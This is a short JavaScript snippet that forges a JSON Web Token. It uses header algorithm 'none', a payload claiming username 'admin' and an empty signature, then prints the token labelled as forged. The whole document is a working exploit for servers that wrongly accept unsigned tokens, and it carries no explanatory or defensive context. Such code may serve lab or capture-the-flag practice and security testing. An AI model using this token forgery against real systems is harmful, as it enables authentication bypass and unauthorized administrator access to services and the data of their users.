function base64url(input) {
  return Buffer.from(JSON.stringify(input))
    .toString("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

const header = { alg: "none", typ: "JWT" };
const payload = { username: "admin" };

const forgedToken = `${base64url(header)}.${base64url(payload)}.`; // empty signature

console.log("Forged alg:none token:\n", forgedToken);
